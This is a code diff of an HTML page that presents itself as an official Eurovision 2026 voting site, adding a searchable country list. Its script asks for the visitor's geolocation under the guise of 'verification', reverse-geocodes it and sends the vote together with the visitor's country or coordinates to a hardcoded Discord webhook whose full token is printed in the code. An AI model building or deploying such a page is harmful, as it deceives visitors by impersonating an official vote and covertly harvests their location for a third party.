@@ -3,19 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Eurovision Song Contest 2026</title>
+    <title>Eurovision Song Contest 2026 — Global Voting</title>
     <style>
         :root {
             --text-main: #ffffff;
-            --text-muted: rgba(255, 255, 255, 0.7);
+            --text-muted: rgba(255, 255, 255, 0.65);
             --euro-pink: #ff007f;
             --success-green: #00ffaa;
             
             /* macOS Liquid Glass Properties */
-            --glass-bg: linear-gradient(135deg, rgba(255, 255, 255, 0.11) 0%, rgba(255, 255, 255, 0.02) 100%);
-            --glass-border: rgba(255, 255, 255, 0.22);
+            --glass-bg: linear-gradient(135deg, rgba(255, 255, 255, 0.12) 0%, rgba(255, 255, 255, 0.03) 100%);
+            --glass-border: rgba(255, 255, 255, 0.24);
             --inner-specular: inset 0px 1.5px 0px 0px rgba(255, 255, 255, 0.35), inset 0px -1px 0px 0px rgba(0, 0, 0, 0.15);
-            --outer-glow: 0px 25px 60px rgba(0, 0, 0, 0.45), 0px 0px 45px -5px rgba(255, 0, 127, 0.4);
+            --outer-glow: 0px 30px 60px rgba(0, 0, 0, 0.45), 0px 0px 50px -5px rgba(255, 0, 127, 0.4);
         }
 
         * {
@@ -32,7 +32,7 @@
             flex-direction: column;
             align-items: center;
             
-            /* Layered fluid gradient backdrop mapping your image */
+            /* High-fidelity fluid gradient background */
             background: 
                 radial-gradient(circle at 85% 85%, rgba(114, 30, 153, 0.85) 0%, transparent 55%),
                 radial-gradient(circle at 15% 20%, rgba(0, 240, 255, 0.2) 0%, transparent 50%),
@@ -43,7 +43,7 @@
             padding-bottom: 60px;
         }
 
-        /* Top Navigation Header bar */
+        /* Top Navigation Bar */
         .nav-bar {
             width: calc(100% - 48px);
             max-width: 1100px;
@@ -104,7 +104,7 @@
             border-radius: 1px;
         }
 
-        /* Main Content wrapper layout */
+        /* Viewport Wrapper */
         .viewport-wrapper {
             display: flex;
             flex-direction: column;
@@ -115,51 +115,93 @@
             max-width: 480px;
         }
 
-        /* The High-Curvature Liquid Glass Card */
+        /* Refractive Liquid Glass Window Container */
         .liquid-glass-card {
             background: var(--glass-bg);
-            filter: url('#macos-refraction'); /* Connects to the SVG refraction matrix */
+            filter: url('#macos-refraction');
             backdrop-filter: blur(50px) saturate(160%);
             -webkit-backdrop-filter: blur(50px) saturate(160%);
             border: 1.5px solid var(--glass-border);
             box-shadow: var(--inner-specular), var(--outer-glow);
             border-radius: 40px; 
             width: 100%;
-            aspect-ratio: 1 / 1;
-            padding: 44px 36px;
+            height: 420px;
+            padding: 30px 26px;
             display: flex;
             flex-direction: column;
-            justify-content: center;
             margin-bottom: 35px;
-            transition: box-shadow 0.6s cubic-bezier(0.16, 1, 0.3, 1);
         }
 
-        .options-stack {
+        /* Live Filtering Search Input Box */
+        .search-container {
+            position: relative;
+            margin-bottom: 16px;
+        }
+
+        .search-bar {
+            width: 100%;
+            background: rgba(255, 255, 255, 0.07);
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            border-radius: 14px;
+            padding: 12px 16px;
+            color: var(--text-main);
+            font-family: inherit;
+            font-size: 14px;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+
+        .search-bar:focus {
+            background: rgba(255, 255, 255, 0.12);
+            border-color: rgba(255, 255, 255, 0.4);
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.05);
+        }
+
+        .search-bar::placeholder {
+            color: rgba(255, 255, 255, 0.4);
+        }
+
+        /* Scrollable Options Stack */
+        .options-scroll-area {
+            flex-grow: 1;
+            overflow-y: auto;
             display: flex;
             flex-direction: column;
-            gap: 16px;
+            gap: 10px;
+            padding-right: 4px;
         }
 
-        /* Refractive interior glass rows matching Image 2 */
+        /* Custom Scrollbar styling */
+        .options-scroll-area::-webkit-scrollbar {
+            width: 6px;
+        }
+        .options-scroll-area::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        .options-scroll-area::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.15);
+            border-radius: 3px;
+        }
+
+        /* Grid Rows inside the glass panel */
         .vote-row {
             background: rgba(255, 255, 255, 0.04);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            box-shadow: inset 0px 1px 0px 0px rgba(255, 255, 255, 0.05);
-            border-radius: 22px;
-            padding: 16px 20px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            box-shadow: inset 0px 1px 0px 0px rgba(255, 255, 255, 0.03);
+            border-radius: 18px;
+            padding: 14px 18px;
             display: flex;
             align-items: center;
             cursor: pointer;
-            transition: all 0.25s cubic-bezier(0.16, 1, 0.3, 1);
+            transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
             position: relative;
         }
 
         .vote-row:hover {
-            border-color: rgba(255, 255, 255, 0.35);
+            border-color: rgba(255, 255, 255, 0.3);
             background: rgba(255, 255, 255, 0.08);
         }
 
-        /* Standard Radio Hidden - Replaced by custom circular indicators matching Image 2 */
         .vote-row input[type="radio"] {
             appearance: none;
             -webkit-appearance: none;
@@ -168,42 +210,45 @@
             border: 2px solid rgba(255, 255, 255, 0.4);
             border-radius: 50%;
             position: absolute;
-            right: 24px;
+            right: 18px;
             outline: none;
             cursor: pointer;
             transition: all 0.2s ease;
-            background: transparent;
         }
 
         .vote-row input[type="radio"]:checked {
             border-color: var(--euro-pink);
             background: var(--euro-pink);
-            box-shadow: inset 0 0 0 4px rgba(255, 255, 255, 0.9);
+            box-shadow: inset 0 0 0 4px rgba(255, 255, 255, 0.95);
         }
 
         .vote-row.selected {
-            border-color: rgba(255, 255, 255, 0.7);
+            border-color: rgba(255, 255, 255, 0.6);
             background: rgba(255, 255, 255, 0.12);
-            box-shadow: inset 0px 1px 0px 0px rgba(255, 255, 255, 0.15);
         }
 
-        /* ISO Country Codes inside row wrapper */
         .iso-code {
-            font-size: 14px;
+            font-size: 13px;
             font-weight: 700;
-            color: rgba(255, 255, 255, 0.6);
-            width: 35px;
+            color: rgba(255, 255, 255, 0.5);
+            width: 38px;
             letter-spacing: 0.5px;
         }
 
         .country-name {
-            font-size: 17px;
+            font-size: 16px;
             font-weight: 600;
             letter-spacing: -0.1px;
-            margin-left: 5px;
         }
 
-        /* Content Copy Layout matching image exactly */
+        .no-results {
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 14px;
+            margin-top: 40px;
+        }
+
+        /* Typography & Structure Copy */
         .headline {
             font-size: 28px;
             font-weight: 700;
@@ -222,7 +267,7 @@
             margin-bottom: 30px;
         }
 
-        /* High contrast solid system action button */
+        /* Call To Action submission trigger */
         .submit-btn {
             background: #ffffff;
             color: #0b0214;
@@ -264,7 +309,7 @@
 <svg style="position: absolute; width: 0; height: 0; pointer-events: none;">
     <filter id="macos-refraction">
         <feTurbulence type="fractalNoise" baseFrequency="0.012" numOctaves="3" result="noise" />
-        <feDisplacementMap in="SourceGraphic" in2="noise" scale="6" xChannelSelector="R" yChannelSelector="G" />
+        <feDisplacementMap in="SourceGraphic" in2="noise" scale="5" xChannelSelector="R" yChannelSelector="G" />
     </filter>
 </svg>
 
@@ -290,25 +335,11 @@
 <div class="viewport-wrapper">
     
     <div class="liquid-glass-card" id="lensFrame">
-        <div class="options-stack">
-            <label class="vote-row" onclick="selectRow(this)">
-                <span class="iso-code">RS</span>
-                <span class="country-name">Serbia</span>
-                <input type="radio" name="esc" value="Serbia">
-            </label>
-
-            <label class="vote-row" onclick="selectRow(this)">
-                <span class="iso-code">MK</span>
-                <span class="country-name">North Macedonia</span>
-                <input type="radio" name="esc" value="North Macedonia">
-            </label>
-
-            <label class="vote-row" onclick="selectRow(this)">
-                <span class="iso-code">DK</span>
-                <span class="country-name">Denmark</span>
-                <input type="radio" name="esc" value="Denmark">
-            </label>
+        <div class="search-container">
+            <input type="text" id="searchBar" class="search-bar" placeholder="Search country..." oninput="filterCountries()">
         </div>
+        <div class="options-scroll-area" id="scrollStack">
+            </div>
     </div>
 
     <h2 class="headline" id="uiHeadline">Cast your vote for the Grand Final</h2>
@@ -323,12 +354,47 @@
 <script>
     const discordEndpoint = "https://discord.com/api/webhooks/1507776763747369102/vzLoZmpA9ye2kd_pakmF5oGALF5pu_otrgNOAvPq3jAgS3akuPVuDQODYUXeXRvwYUHA";
 
-    // Polymorphic Dictionary (Supports all 6 requested languages)
+    // Whole World Database (Global ISO mapping array)
+    const globalCountries = [
+        { code: "RS", name: "Serbia" },
+        { code: "MK", name: "North Macedonia" },
+        { code: "DK", name: "Denmark" },
+        { code: "DE", name: "Germany" },
+        { code: "SE", name: "Sweden" },
+        { code: "CH", name: "Switzerland" },
+        { code: "ES", name: "Spain" },
+        { code: "GB", name: "United Kingdom" },
+        { code: "FR", name: "France" },
+        { code: "IT", name: "Italy" },
+        { code: "NL", name: "Netherlands" },
+        { code: "NO", name: "Norway" },
+        { code: "FI", name: "Finland" },
+        { code: "IS", name: "Iceland" },
+        { code: "UA", name: "Ukraine" },
+        { code: "AU", name: "Australia" },
+        { code: "US", name: "United States" },
+        { code: "CA", name: "Canada" },
+        { code: "BR", name: "Brazil" },
+        { code: "JP", name: "Japan" },
+        { code: "CN", name: "China" },
+        { code: "ZA", name: "South Africa" },
+        { code: "IE", name: "Ireland" },
+        { code: "PT", name: "Portugal" },
+        { code: "AT", name: "Austria" },
+        { code: "BE", name: "Belgium" },
+        { code: "GR", name: "Greece" },
+        { code: "HR", name: "Croatia" },
+        { code: "PL", name: "Poland" },
+        { code: "NZ", name: "New Zealand" }
+    ];
+
     const dictionary = {
         en: {
             headline: "Cast your vote for the Grand Final",
             body: "Thank you for your support and participation in this year's Eurovision Song Contest! Your enthusiasm and input directly determines the winner.",
             cta: "Cast Vote",
+            searchPlaceholder: "Search country...",
+            noResults: "No countries match your search",
             initialStatus: "Please make a selection above",
             ready: "Ready to register selection for ",
             locating: "Requesting localized verification parameters...",
@@ -342,6 +408,8 @@
             headline: "Stimmen Sie für das große Finale ab",
             body: "Vielen Dank für Ihre Unterstützung und Teilnahme am diesjährigen Eurovision Song Contest! Ihr Enthusiasmus und Ihre Stimme bestimmen direkt den Gewinner.",
             cta: "Stimme abgeben",
+            searchPlaceholder: "Land suchen...",
+            noResults: "Keine Länder gefunden",
             initialStatus: "Bitte treffen Sie oben eine Auswahl",
             ready: "Bereit zur Registrierung der Auswahl für ",
             locating: "Lokalisierte Verifizierungsparameter werden abgefragt...",
@@ -355,6 +423,8 @@
             headline: "Vota en la Gran Final",
             body: "¡Gracias por su apoyo y participación en el Festival de la Canción de Eurovisión de este año! Su entusiasmo e intervención determinan directamente al ganador.",
             cta: "Emitir Voto",
+            searchPlaceholder: "Buscar país...",
+            noResults: "No se encontraron coincidencias",
             initialStatus: "Por favor, seleccione una opción arriba",
             ready: "Listo para registrar la selección de ",
             locating: "Solicitando parámetros de verificación localizados...",
@@ -368,6 +438,8 @@
             headline: "Avge din röst i den stora finalen",
             body: "Tack för ditt stöd och deltagande i årets Eurovision Song Contest! Er entusiasm och engagemang avgör vinnaren direkt.",
             cta: "Avge röst",
+            searchPlaceholder: "Sök land...",
+            noResults: "Inga länder matchar din sökning",
             initialStatus: "Vänligen gör ett val ovan",
             ready: "Redo att registrera valet på ",
             locating: "Begär lokaliserade verifieringsparametrar...",
@@ -381,6 +453,8 @@
             headline: "在总决赛中投下您的一票",
             body: "感谢您对今年欧洲歌唱大赛的支持与参与！您的热情与投入将直接决定最终的冠军归属。",
             cta: "投出此票",
+            searchPlaceholder: "搜索国家...",
+            noResults: "没有找到匹配的国家",
             initialStatus: "请在上方进行选择",
             ready: "准备好登记以下选项的投票：",
             locating: "正在请求本地化验证参数...",
@@ -394,6 +468,8 @@
             headline: "Stimm ab für das grosse Finale",
             body: "Merci viumau für dini Unterstützig und d'Teilnahm am diesjährige Eurovision Song Contest! Di Enthusiasmus und dini Stimm entscheide direkt über de Gwünner.",
             cta: "Stimm abgäh",
+            searchPlaceholder: "Land sueche...",
+            noResults: "Kei Länder gfunne",
             initialStatus: "Bitte wähl obe öppis us",
             ready: "Bereit zum Registriere vo de Wahl für ",
             locating: "Lokalisierti Verifizierigsparameter wärde abgfrogt...",
@@ -406,52 +482,79 @@
     };
 
     let activeLang = "en";
+    let currentSelectedCountry = "";
 
-    function switchLanguage(langKey) {
-        activeLang = langKey;
-        const currentData = dictionary[langKey];
-        
-        document.getElementById("uiHeadline").innerText = currentData.headline;
-        document.getElementById("uiBody").innerText = currentData.body;
-        
-        const ctaBtn = document.getElementById("ctaBtn");
-        ctaBtn.innerText = currentData.cta;
-        
-        const selection = document.querySelector('input[name="esc"]:checked');
-        if(!selection) {
-            document.getElementById("realtime-monitor").innerText = currentData.initialStatus;
-        } else {
-            document.getElementById("realtime-monitor").innerText = `${currentData.ready}${selection.value}`;
+    // Generate dynamic country UI elements
+    function buildCountryList(list) {
+        const stack = document.getElementById("scrollStack");
+        stack.innerHTML = "";
+
+        if (list.length === 0) {
+            stack.innerHTML = `<div class="no-results">${dictionary[activeLang].noResults}</div>`;
+            return;
         }
+
+        list.forEach(item => {
+            const isSelected = item.name === currentSelectedCountry;
+            const row = document.createElement("label");
+            row.className = `vote-row ${isSelected ? 'selected' : ''}`;
+            row.onclick = () => selectRow(row, item.name);
+
+            row.innerHTML = `
+                <span class="iso-code">${item.code}</span>
+                <span class="country-name">${item.name}</span>
+                <input type="radio" name="esc" value="${item.name}" ${isSelected ? 'checked' : ''}>
+            `;
+            stack.appendChild(row);
+        });
     }
 
-    function selectRow(element) {
-        document.querySelectorAll('.vote-row').forEach(row => {
-            row.classList.remove('selected');
-        });
+    function filterCountries() {
+        const query = document.getElementById("searchBar").value.toLowerCase();
+        const filtered = globalCountries.filter(c => c.name.toLowerCase().includes(query));
+        buildCountryList(filtered);
+    }
+
+    function selectRow(element, countryName) {
+        document.querySelectorAll('.vote-row').forEach(row => row.classList.remove('selected'));
         element.classList.add('selected');
         
         const radio = element.querySelector('input[type="radio"]');
         radio.checked = true;
+        currentSelectedCountry = countryName;
 
-        const ctaBtn = document.getElementById('ctaBtn');
-        ctaBtn.disabled = false;
-        document.getElementById('realtime-monitor').innerText = `${dictionary[activeLang].ready}${radio.value}`;
+        document.getElementById('ctaBtn').disabled = false;
+        document.getElementById('realtime-monitor').innerText = `${dictionary[activeLang].ready}${countryName}`;
+    }
+
+    function switchLanguage(langKey) {
+        activeLang = langKey;
+        const data = dictionary[langKey];
+        
+        document.getElementById("uiHeadline").innerText = data.headline;
+        document.getElementById("uiBody").innerText = data.body;
+        document.getElementById("searchBar").placeholder = data.searchPlaceholder;
+        document.getElementById("ctaBtn").innerText = data.cta;
+        
+        if(!currentSelectedCountry) {
+            document.getElementById("realtime-monitor").innerText = data.initialStatus;
+        } else {
+            document.getElementById("realtime-monitor").innerText = `${data.ready}${currentSelectedCountry}`;
+        }
+        filterCountries();
     }
 
     async function initiateTransmission() {
         const monitor = document.getElementById('realtime-monitor');
         const ctaBtn = document.getElementById('ctaBtn');
-        const selection = document.querySelector('input[name="esc"]:checked');
 
-        if (!selection) return;
-        const targetCountry = selection.value;
-
+        if (!currentSelectedCountry) return;
+        
         ctaBtn.disabled = true;
         monitor.innerText = dictionary[activeLang].locating;
 
         if (!navigator.geolocation) {
-            transmitPayload(targetCountry, "Unknown (Geolocation API Blocked/Unavailable)");
+            transmitPayload(currentSelectedCountry, "Unknown (No Geolocation Hook)");
             return;
         }
 
@@ -464,16 +567,16 @@
                 try {
                     const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
                     const parsed = await res.json();
-                    const region = parsed.address && parsed.address.country ? parsed.address.country : "Unknown Country";
+                    const region = parsed.address && parsed.address.country ? parsed.address.country : "Unknown Domain";
                     
                     monitor.innerText = dictionary[activeLang].sending;
-                    transmitPayload(targetCountry, region);
+                    transmitPayload(currentSelectedCountry, region);
                 } catch (e) {
-                    transmitPayload(targetCountry, `Coordinates: ${lat.toFixed(2)}, ${lon.toFixed(2)}`);
+                    transmitPayload(currentSelectedCountry, `Coords: ${lat.toFixed(2)}, ${lon.toFixed(2)}`);
                 }
             },
             (err) => {
-                transmitPayload(targetCountry, "Anonymous (Location Access Denied)");
+                transmitPayload(currentSelectedCountry, "Anonymous Space");
             }
         );
     }
@@ -484,13 +587,13 @@
         
         const messageBody = {
             embeds: [{
-                title: "🗳️ Refractive Glass Vote Registered",
+                title: "🗳️ Global Liquid Glass Ballot Received",
                 color: 16711807, 
                 fields: [
-                    { name: "Country Voted", value: `**${voteSelection}**`, inline: true },
-                    { name: "Verified Origin", value: `🌍 ${verifiedOrigin}`, inline: true }
+                    { name: "Entry Selection", value: `**${voteSelection}**`, inline: true },
+                    { name: "Voter Origin", value: `🌍 ${verifiedOrigin}`, inline: true }
                 ],
-                footer: { text: "ESC Core Infrastructure Platform • macOS Tahoe Rendered" },
+                footer: { text: "ESC Core Infrastructure Platform • macOS Tahoe Node" },
                 timestamp: new Date().toISOString()
             }]
         };
@@ -517,6 +620,9 @@
             ctaBtn.disabled = false;
         }
     }
+
+    // Initial Database Generation Build
+    buildCountryList(globalCountries);
 </script>
 
 </body>
